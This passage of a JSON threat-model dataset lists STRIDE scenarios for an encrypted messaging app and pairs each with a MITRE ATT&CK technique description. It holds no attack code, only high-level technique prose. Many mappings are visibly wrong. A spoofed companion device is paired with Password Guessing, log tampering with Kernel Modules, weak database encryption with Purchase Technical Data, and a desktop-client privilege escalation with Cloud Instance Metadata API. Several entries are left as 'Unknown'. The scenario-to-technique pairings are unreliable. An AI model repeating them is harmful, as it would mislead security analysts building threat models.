                "id": "attack-pattern--f4599aa0-4f85-4a32-80ea-fc39dc965945",
                "technique_id": "T1055.001"
            }
        }
    ]
},
{
    "case_number": "13",
    "batch_number": "1",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker creates a fake companion device that appears to be linked by the primary device.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has the capability to generate a fake identity key for the desktop client.",
                    "Role": "Attacker",
                    "Condition": "Attacker can compromise the key generation process or use a valid private key."
                },
                {
                    "Assumption": "The attacker can communicate with the primary device to get it to authenticate the fake companion device.",
                    "Role": "Attacker",
                    "Condition": "Primary device is unaware of compromised authentication."
                },
                {
                    "Assumption": "The user is unable to distinguish the spoofed companion device from a legitimate one.",
                    "Role": "User",
                    "Condition": "Lack of proper verification mechanisms or user vigilance."
                }
            ],
            "Potential Impact": "Unauthorized disclosure of messages.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "device",
                "authentication"
            ],
            "mitre_technique": {
                "name": "Password Guessing",
                "description": "Adversaries with no prior knowledge of legitimate credentials within the system or environment may guess passwords to attempt access to accounts. Without knowledge of the password for an account, an adversary may opt to systematically guess the password using a repetitive or iterative mechanism. An adversary may guess login credentials without prior knowledge of system or environment passwords during an operation by using a list of common passwords. Password guessing may or may not take into account the target's policies on password complexity or use policies that may lock accounts out after a number of failed attempts.\n\nGuessing passwords can be a risky option because it could cause numerous authentication failures and account lockouts, depending on the organization's login failure policies. (Citation: Cylance Cleaver)\n\nTypically, management services over commonly used ports are used when guessing passwords. Commonly targeted services include the following:\n\n* SSH (22/TCP)\n* Telnet (23/TCP)\n* FTP (21/TCP)\n* NetBIOS / SMB / Samba (139/TCP & 445/TCP)\n* LDAP (389/TCP)\n* Kerberos (88/TCP)\n* RDP / Terminal Services (3389/TCP)\n* HTTP/HTTP Management Services (80/TCP & 443/TCP)\n* MSSQL (1433/TCP)\n* Oracle (1521/TCP)\n* MySQL (3306/TCP)\n* VNC (5900/TCP)\n* SNMP (161/UDP and 162/TCP/UDP)\n\nIn addition to management services, adversaries may \"target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols,\" as well as externally facing email applications, such as Office 365.(Citation: US-CERT TA18-068A 2018). Further, adversaries may abuse network device interfaces (such as `wlanAPI`) to brute force accessible wifi-router(s) via wireless authentication protocols.(Citation: Trend Micro Emotet 2020)\n\nIn default environments, LDAP and Kerberos connection attempts are less likely to trigger events over SMB, which creates Windows \"logon failure\" event ID 4625.",
                "id": "attack-pattern--09c4c11e-4fa1-4f8c-8dad-3cf8e69ad119",
                "technique_id": "T1110.001"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker intercepts the communication between the primary device and the server, presenting themselves as the server.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has access to the network traffic between the devices and the server.",
                    "Role": "Attacker",
                    "Condition": "Man-in-the-middle position achieved."
                },
                {
                    "Assumption": "The primary device does not effectively validate the server\u2019s identity.",
                    "Role": "Application",
                    "Condition": "Weak server validation mechanisms."
                },
                {
                    "Assumption": "Encryption protocols or the implementation can be bypassed or manipulated.",
                    "Role": "Application",
                    "Condition": "Vulnerable encryption protocol or implementation."
                }
            ],
            "Potential Impact": "Unauthorized access to sensitive data during transmission.",
            "MITRE ATT&CK Keywords": [
                "network",
                "man-in-the-middle",
                "spoofing",
                "interception"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker uses a phishing campaign to trick users into downloading a malicious version of the messaging application.",
            "Assumptions": [
                {
                    "Assumption": "The attacker can craft a credible phishing campaign.",
                    "Role": "Attacker",
                    "Condition": "Effective social engineering tactics."
                },
                {
                    "Assumption": "Users are not able to distinguish the legitimate app from the malicious one.",
                    "Role": "User",
                    "Condition": "Lack of vigilance or verification mechanisms."
                },
                {
                    "Assumption": "The distribution channels have inadequate security to prevent such an attack.",
                    "Role": "Application",
                    "Condition": "Weak security of app stores or websites."
                }
            ],
            "Potential Impact": "Control of user devices and access to all their communications.",
            "MITRE ATT&CK Keywords": [
                "phishing",
                "malicious application",
                "device compromise"
            ],
            "mitre_technique": {
                "name": "Malicious File",
                "description": "An adversary may rely upon a user opening a malicious file in order to gain execution. Users may be subjected to social engineering to get them to open a file that will lead to code execution. This user action will typically be observed as follow-on behavior from [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001). Adversaries may use several types of files that require a user to execute them, including .doc, .pdf, .xls, .rtf, .scr, .exe, .lnk, .pif, and .cpl.\n\nAdversaries may employ various forms of [Masquerading](https://attack.mitre.org/techniques/T1036) and [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027) to increase the likelihood that a user will open and successfully execute a malicious file. These methods may include using a familiar naming convention and/or password protecting the file and supplying instructions to a user on how to open it.(Citation: Password Protected Word Docs) \n\nWhile [Malicious File](https://attack.mitre.org/techniques/T1204/002) frequently occurs shortly after Initial Access it may occur at other phases of an intrusion, such as when an adversary places a file in a shared directory or on a user's desktop hoping that a user will click on it. This activity may also be seen shortly after [Internal Spearphishing](https://attack.mitre.org/techniques/T1534).",
                "id": "attack-pattern--232b7f21-adf9-4b42-b936-b9d6f7df856e",
                "technique_id": "T1204.002"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker modifies the SQLite database on a user's device to manipulate the stored pre-keys.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has physical or remote access to the user's device.",
                    "Role": "Attacker",
                    "Condition": "Compromised device or remote access is achieved."
                },
                {
                    "Assumption": "The SQLite databases storing pre-keys are not adequately protected.",
                    "Role": "Application",
                    "Condition": "Improper encryption or access controls."
                },
                {
                    "Assumption": "The application does not validate the integrity of the pre-keys before use.",
                    "Role": "Application",
                    "Condition": "Lack of integrity checks."
                }
            ],
            "Potential Impact": "Manipulation of message encryption keys, leading to improper encryption.",
            "MITRE ATT&CK Keywords": [
                "database",
                "tampering",
                "key manipulation",
                "device access"
            ],
            "mitre_technique": {
                "name": "Stored Data Manipulation",
                "description": "Adversaries may insert, delete, or manipulate data at rest in order to manipulate external outcomes or hide activity.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating stored data, adversaries may attempt to affect a business process, organizational understanding, and decision making. \n\nStored data could include a variety of file formats, such as Office files, databases, stored emails, and custom file formats. The type of modification and the impact it will have depends on the type of data as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
                "id": "attack-pattern--0bf78622-e8d2-41da-a857-731472d61a92",
                "technique_id": "T1492"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker gains access to the primary device and injects malicious code into the application.",
            "Assumptions": [
                {
                    "Assumption": "The attacker can run arbitrary code on the primary device.",
                    "Role": "Attacker",
                    "Condition": "Device is already compromised or poorly secured."
                },
                {
                    "Assumption": "The attacker can modify application code without detection.",
                    "Role": "Application",
                    "Condition": "Lack of code integrity checks."
                },
                {
                    "Assumption": "The injected code can run with the same privileges as the legitimate app.",
                    "Role": "Attacker",
                    "Condition": "Code runs in the application\u2019s context."
                }
            ],
            "Potential Impact": "Unauthorized actions, data manipulation, and potential data theft.",
            "MITRE ATT&CK Keywords": [
                "code injection",
                "application",
                "device",
                "compromise"
            ],
            "mitre_technique": {
                "name": "Extra Window Memory Injection",
                "description": "Adversaries may inject malicious code into process via Extra Window Memory (EWM) in order to evade process-based defenses as well as possibly elevate privileges. EWM injection is a method of executing arbitrary code in the address space of a separate live process. \n\nBefore creating a window, graphical Windows-based processes must prescribe to or register a windows class, which stipulate appearance and behavior (via windows procedures, which are functions that handle input/output of data).(Citation: Microsoft Window Classes) Registration of new windows classes can include a request for up to 40 bytes of EWM to be appended to the allocated memory of each instance of that class. This EWM is intended to store data specific to that window and has specific application programming interface (API) functions to set and get its value. (Citation: Microsoft GetWindowLong function) (Citation: Microsoft SetWindowLong function)\n\nAlthough small, the EWM is large enough to store a 32-bit pointer and is often used to point to a windows procedure. Malware may possibly utilize this memory location in part of an attack chain that includes writing code to shared sections of the process\u2019s memory, placing a pointer to the code in EWM, then invoking execution by returning execution control to the address in the process\u2019s EWM.\n\nExecution granted through EWM injection may allow access to both the target process's memory and possibly elevated privileges. Writing payloads to shared sections also avoids the use of highly monitored API calls such as <code>WriteProcessMemory</code> and <code>CreateRemoteThread</code>.(Citation: Elastic Process Injection July 2017) More sophisticated malware samples may also potentially bypass protection mechanisms such as data execution prevention (DEP) by triggering a combination of windows procedures and other system functions that will rewrite the malicious payload inside an executable portion of the target process.  (Citation: MalwareTech Power Loader Aug 2013) (Citation: WeLiveSecurity Gapz and Redyms Mar 2013)\n\nRunning code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via EWM injection may also evade detection from security products since the execution is masked under a legitimate process. ",
                "id": "attack-pattern--0042a9f5-f053-4769-b3ef-9ad018dfa298",
                "technique_id": "T1055.011"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker intercepts updates to the messaging application, altering legitimate update files with malicious payloads.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has access to the update distribution path.",
                    "Role": "Attacker",
                    "Condition": "Compromised update server or MiTM position."
                },
                {
                    "Assumption": "The updates are not signed or verified correctly.",
                    "Role": "Application",
                    "Condition": "Lack of update integrity verification."
                },
                {
                    "Assumption": "The end user system applies updates without proper validation.",
                    "Role": "Application",
                    "Condition": "Insecure update mechanisms."
                }
            ],
            "Potential Impact": "Compromise of user devices, leading to unauthorized control and data access.",
            "MITRE ATT&CK Keywords": [
                "update tampering",
                "distribution",
                "malicious payload"
            ],
            "mitre_technique": {
                "name": "Supply Chain Compromise",
                "description": "Adversaries may manipulate products or product delivery mechanisms prior to receipt by a final consumer for the purpose of data or system compromise.\n\nSupply chain compromise can take place at any stage of the supply chain including:\n\n* Manipulation of development tools\n* Manipulation of a development environment\n* Manipulation of source code repositories (public or private)\n* Manipulation of source code in open-source dependencies\n* Manipulation of software update/distribution mechanisms\n* Compromised/infected system images (multiple cases of removable media infected at the factory)(Citation: IBM Storwize)(Citation: Schneider Electric USB Malware) \n* Replacement of legitimate software with modified versions\n* Sales of modified/counterfeit products to legitimate distributors\n* Shipment interdiction\n\nWhile supply chain compromise can impact any component of hardware or software, adversaries looking to gain execution have often focused on malicious additions to legitimate software in software distribution or update channels.(Citation: Avast CCleaner3 2018)(Citation: Microsoft Dofoil 2018)(Citation: Command Five SK 2011) Targeting may be specific to a desired victim set or malicious software may be distributed to a broad set of consumers but only move on to additional tactics on specific victims.(Citation: Symantec Elderwood Sept 2012)(Citation: Avast CCleaner3 2018)(Citation: Command Five SK 2011) Popular open source projects that are used as dependencies in many applications may also be targeted as a means to add malicious code to users of the dependency.(Citation: Trendmicro NPM Compromise)",
                "id": "attack-pattern--3f18edba-28f4-4bb9-82c3-8aa60dcac5f7",
                "technique_id": "T1195"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A user denies sending a malicious link via the messaging application, because logs can be altered.",
            "Assumptions": [
                {
                    "Assumption": "The logs are stored locally and can be modified.",
                    "Role": "Application",
                    "Condition": "Logs lack protection measures like encryption."
                },
                {
                    "Assumption": "There is no centralized logging or verification.",
                    "Role": "Application",
                    "Condition": "Inadequate logging infrastructure."
                },
                {
                    "Assumption": "Log entries can be altered without detection.",
                    "Role": "Attacker",
                    "Condition": "Lack of tamper-evident mechanisms."
                }
            ],
            "Potential Impact": "Difficulty in attributing actions, leading to potential abuse and security incidents.",
            "MITRE ATT&CK Keywords": [
                "log tampering",
                "denial",
                "illegitimate use"
            ],
            "mitre_technique": {
                "name": "Kernel Modules and Extensions",
                "description": "Loadable Kernel Modules (or LKMs) are pieces of code that can be loaded and unloaded into the kernel upon demand. They extend the functionality of the kernel without the need to reboot the system. For example, one type of module is the device driver, which allows the kernel to access hardware connected to the system. (Citation: Linux Kernel Programming)\u00a0When used maliciously, Loadable Kernel Modules (LKMs) can be a type of kernel-mode [Rootkit](https://attack.mitre.org/techniques/T1014) that run with the highest operating system privilege (Ring 0). (Citation: Linux Kernel Module Programming Guide)\u00a0Adversaries can use loadable kernel modules to covertly persist on a system and evade defenses. Examples have been found in the wild and there are some open source projects. (Citation: Volatility Phalanx2) (Citation: CrowdStrike Linux Rootkit) (Citation: GitHub Reptile) (Citation: GitHub Diamorphine)\n\nCommon features of LKM based rootkits include: hiding itself, selective hiding of files, processes and network activity, as well as log tampering, providing authenticated backdoors and enabling root access to non-privileged users. (Citation: iDefense Rootkit Overview)\n\nKernel extensions, also called kext, are used for macOS to load functionality onto a system similar to LKMs for Linux. They are loaded and unloaded through <code>kextload</code> and <code>kextunload</code> commands. Several examples have been found where this can be used. (Citation: RSAC 2015 San Francisco Patrick Wardle) (Citation: Synack Secure Kernel Extension Broken) Examples have been found in the wild. (Citation: Securelist Ventir)",
                "id": "attack-pattern--6be14413-578e-46c1-8304-310762b3ecd5",
                "technique_id": "T1215"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An attacker denies their involvement in compromising a messaging session, exploiting weak authentication.",
            "Assumptions": [
                {
                    "Assumption": "System logs do not capture sufficient detail to trace back the actions definitively to the attacker.",
                    "Role": "Application",
                    "Condition": "Logs lack granularity or are incomplete."
                },
                {
                    "Assumption": "There is weak verification of actions performed within the messaging application.",
                    "Role": "Application",
                    "Condition": "Weak or missing audit trails."
                },
                {
                    "Assumption": "Actions can be executed without sufficient proof of origin.",
                    "Role": "Application",
                    "Condition": "Insufficient authentication and authorization checks."
                }
            ],
            "Potential Impact": "Difficulty in prosecuting malicious actors, leading to repeated abuse.",
            "MITRE ATT&CK Keywords": [
                "authentication",
                "repudiation",
                "log weakness"
            ],
            "mitre_technique": {
                "name": "Pluggable Authentication Modules",
                "description": "Adversaries may modify pluggable authentication modules (PAM) to access user credentials or enable otherwise unwarranted access to accounts. PAM is a modular system of configuration files, libraries, and executable files which guide authentication for many services. The most common authentication module is <code>pam_unix.so</code>, which retrieves, sets, and verifies account authentication information in <code>/etc/passwd</code> and <code>/etc/shadow</code>.(Citation: Apple PAM)(Citation: Man Pam_Unix)(Citation: Red Hat PAM)\n\nAdversaries may modify components of the PAM system to create backdoors. PAM components, such as <code>pam_unix.so</code>, can be patched to accept arbitrary adversary supplied values as legitimate credentials.(Citation: PAM Backdoor)\n\nMalicious modifications to the PAM system may also be abused to steal credentials. Adversaries may infect PAM resources with code to harvest user credentials, since the values exchanged with PAM components may be plain-text since PAM does not store passwords.(Citation: PAM Creds)(Citation: Apple PAM)",
                "id": "attack-pattern--06c00069-771a-4d57-8ef5-d3718c1a8771",
                "technique_id": "T1556.003"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A legitimate user claims that they have not received a specific message, due to possible log tampering or message deletion on the server.",
            "Assumptions": [
                {
                    "Assumption": "The integrity of message logs is not ensured by the application.",
                    "Role": "Application",
                    "Condition": "Message logs are stored in an insecure manner."
                },
                {
                    "Assumption": "There are no mechanisms to verify message delivery and integrity post-delivery.",
                    "Role": "Application",
                    "Condition": "Lack of delivery acknowledgments."
                },
                {
                    "Assumption": "The server allows deletion of logs without proper authorization and auditing.",
                    "Role": "Application",
                    "Condition": "Weak server security and logging policies."
                }
            ],
            "Potential Impact": "Loss of trust in the system\u2019s reliability and potential misuse of repudiation.",
            "MITRE ATT&CK Keywords": [
                "message integrity",
                "log deletion",
                "denial"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker exploits a vulnerability in the SQLite database encryption to access stored messages.",
            "Assumptions": [
                {
                    "Assumption": "The application's database encryption is weak or has known vulnerabilities.",
                    "Role": "Application",
                    "Condition": "Use of weak encryption algorithms."
                },
                {
                    "Assumption": "The attacker has access to the database file.",
                    "Role": "Attacker",
                    "Condition": "Local access to the user's device or backup."
                },
                {
                    "Assumption": "There are no additional layers of protection (e.g., file system encryption).",
                    "Role": "User",
                    "Condition": "Relying solely on the app\u2019s encryption."
                }
            ],
            "Potential Impact": "Unauthorized disclosure of sensitive stored messages.",
            "MITRE ATT&CK Keywords": [
                "database",
                "encryption",
                "vulnerability",
                "data breach"
            ],
            "mitre_technique": {
                "name": "Purchase Technical Data",
                "description": "Adversaries may purchase technical information about victims that can be used during targeting. Information about victims may be available for purchase within reputable private sources and databases, such as paid subscriptions to feeds of scan databases or other data aggregation services. Adversaries may also purchase information from less-reputable sources such as dark web or cybercrime blackmarkets.\n\nAdversaries may purchase information about their already identified targets, or use purchased data to discover opportunities for successful breaches. Threat actors may gather various technical details from purchased data, including but not limited to employee contact information, credentials, or specifics regarding a victim\u2019s infrastructure.(Citation: ZDNET Selling Data) Information from these sources may reveal opportunities for other forms of reconnaissance (ex: [Phishing for Information](https://attack.mitre.org/techniques/T1598) or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133) or [Valid Accounts](https://attack.mitre.org/techniques/T1078)).",
                "id": "attack-pattern--0a241b6c-7bb2-48f9-98f7-128145b4d27f",
                "technique_id": "T1597.002"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker uses a phishing attack to trick users into revealing their private keys.",
            "Assumptions": [
                {
                    "Assumption": "The attacker can craft a convincing phishing attempt.",
                    "Role": "Attacker",
                    "Condition": "Effective social engineering techniques."
                },
                {
                    "Assumption": "Users are not diligent in verifying the legitimacy of the requests.",
                    "Role": "User",
                    "Condition": "Lack of user training and awareness."
                },
                {
                    "Assumption": "There are no mechanisms to prevent users from sharing private keys.",
                    "Role": "Application",
                    "Condition": "Inadequate application controls."
                }
            ],
            "Potential Impact": "Compromised private keys lead to reading of encrypted messages.",
            "MITRE ATT&CK Keywords": [
                "phishing",
                "private key",
                "data exposure"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--2d3f5b3c-54ca-405d-acef-b9129b816ed6",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker gains unauthorized access to messages by compromising the E2EE server.",
            "Assumptions": [
                {
                    "Assumption": "The server hosting the messaging application is vulnerable to attacks.",
                    "Role": "Application",
                    "Condition": "Unpatched server vulnerabilities."
                },
                {
                    "Assumption": "Even with encryption, metadata and access channels can be revealing.",
                    "Role": "Application",
                    "Condition": "Insufficient metadata protection."
                },
                {
                    "Assumption": "There is no application-layer encryption to protect the data from the server itself.",
                    "Role": "Application",
                    "Condition": "Relies on network-layer encryption only."
                }
            ],
            "Potential Impact": "Unauthorized access to and analysis of message content.",
            "MITRE ATT&CK Keywords": [
                "server compromise",
                "metadata exposure",
                "data breach"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker floods the messaging servers with high traffic, making the service unavailable.",
            "Assumptions": [
                {
                    "Assumption": "The attacker can generate sufficient network traffic to overwhelm the servers.",
                    "Role": "Attacker",
                    "Condition": "Access to a botnet or other amplification methods."
                },
                {
                    "Assumption": "The messaging servers are not sufficiently protected against DDoS attacks.",
                    "Role": "Application",
                    "Condition": "Lack of DDoS mitigation measures."
                },
                {
                    "Assumption": "There are no additional scalabilities or failover mechanisms.",
                    "Role": "Application",
                    "Condition": "Inadequate server robustness."
                }
            ],
            "Potential Impact": "Service disruption and inaccessibility.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "flooding",
                "service disruption"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker identifies and exploits a bug in the messaging application to crash it.",
            "Assumptions": [
                {
                    "Assumption": "The application has an exploitable software bug.",
                    "Role": "Application",
                    "Condition": "Unpatched or newly discovered vulnerability."
                },
                {
                    "Assumption": "The attacker can trigger the bug to reliably crash the application.",
                    "Role": "Attacker",
                    "Condition": "Knowledge of application internals."
                },
                {
                    "Assumption": "There is no input validation or error handling for such payloads.",
                    "Role": "Application",
                    "Condition": "Weak robustness and handling."
                }
            ],
            "Potential Impact": "Application crashes, leading to denial of service for users.",
            "MITRE ATT&CK Keywords": [
                "application bug",
                "crash",
                "exploitation"
            ],
            "mitre_technique": {
                "name": "Application or System Exploitation",
                "description": "Adversaries may exploit software vulnerabilities that can cause an application or system to crash and deny availability to users. (Citation: Sucuri BIND9 August 2015) Some systems may automatically restart critical applications and services when crashes occur, but they can likely be re-exploited to cause a persistent denial of service (DoS) condition.\n\nAdversaries may exploit known or zero-day vulnerabilities to crash applications and/or systems, which may also lead to dependent applications and/or systems to be in a DoS condition. Crashed or restarted applications or systems may also have other effects such as [Data Destruction](https://attack.mitre.org/techniques/T1485), [Firmware Corruption](https://attack.mitre.org/techniques/T1495), [Service Stop](https://attack.mitre.org/techniques/T1489) etc. which may further cause a DoS condition and deny availability to critical information, applications and/or systems. ",
                "id": "attack-pattern--2bee5ffb-7a7a-4119-b1f2-158151b19ac0",
                "technique_id": "T1499.004"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker sends malformed messages that the application cannot process, causing it to become unresponsive.",
            "Assumptions": [
                {
                    "Assumption": "The application does not properly validate incoming message formats.",
                    "Role": "Application",
                    "Condition": "Weak message validation."
                },
                {
                    "Assumption": "Malformed messages can be sent without detection or filtering.",
                    "Role": "Attacker",
                    "Condition": "Lack of message format enforcement."
                },
                {
                    "Assumption": "Repeated attempts can prevent legitimate communication.",
                    "Role": "Attacker",
                    "Condition": "High-volume transmission of malformed messages."
                }
            ],
            "Potential Impact": "Application hang and denial of service.",
            "MITRE ATT&CK Keywords": [
                "message processing",
                "malformed messages",
                "service unavailability"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker exploits a vulnerability in the desktop client to gain admin access to the primary device.",
            "Assumptions": [
                {
                    "Assumption": "The desktop client contains an exploitable vulnerability.",
                    "Role": "Application",
                    "Condition": "Unpatched or zero-day vulnerability."
                },
                {
                    "Assumption": "The attacker can run code on the desktop client.",
                    "Role": "Attacker",
                    "Condition": "Local access or compromised client."
                },
                {
                    "Assumption": "The compromised client has sufficient permissions to affect the primary device.",
                    "Role": "Attacker",
                    "Condition": "High privilege operation required."
                }
            ],
            "Potential Impact": "Admin access leads to full control over the user's device and data.",
            "MITRE ATT&CK Keywords": [
                "desktop client",
                "privilege escalation",
                "vulnerability"
            ],
            "mitre_technique": {
                "name": "Cloud Instance Metadata API",
                "description": "Adversaries may attempt to access the Cloud Instance Metadata API to collect credentials and other sensitive data.\n\nMost cloud service providers support a Cloud Instance Metadata API which is a service provided to running virtual instances that allows applications to access information about the running virtual instance. Available information generally includes name, security group, and additional metadata including sensitive data such as credentials and UserData scripts that may contain additional secrets. The Instance Metadata API is provided as a convenience to assist in managing applications and is accessible by anyone who can access the instance.(Citation: AWS Instance Metadata API) A cloud metadata API has been used in at least one high profile compromise.(Citation: Krebs Capital One August 2019)\n\nIf adversaries have a presence on the running virtual instance, they may query the Instance Metadata API directly to identify credentials that grant access to additional resources. Additionally, adversaries may exploit a Server-Side Request Forgery (SSRF) vulnerability in a public facing web proxy that allows them to gain access to the sensitive information via a request to the Instance Metadata API.(Citation: RedLock Instance Metadata API 2018)\n\nThe de facto standard across cloud service providers is to host the Instance Metadata API at <code>http[:]//169.254.169.254</code>.\n",
                "id": "attack-pattern--19bf235b-8620-4997-b5b4-94e0659ed7c3",
                "technique_id": "T1552.005"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker leverages a flaw in the messaging app to gain root access on a mobile device.",
            "Assumptions": [
                {
                    "Assumption": "The mobile app has a root access vulnerability.",
                    "Role": "Application",
                    "Condition": "Unpatched vulnerability within the app."
                },
                {
                    "Assumption": "The attacker can trigger the vulnerability through the app\u2019s interface.",
                    "Role": "Attacker",
                    "Condition": "Access to the app and interaction vector."
                },
                {
                    "Assumption": "The mobile device does not have protections against such privilege escalations.",
                    "Role": "Application",
                    "Condition": "Lack of effective mobile security measures."
                }
            ],
            "Potential Impact": "Complete control over the mobile device, access to all data and capabilities.",
            "MITRE ATT&CK Keywords": [
                "mobile device",
                "root access",
                "security flaw"
            ],
            "mitre_technique": {
                "name": "Kernel Modules and Extensions",
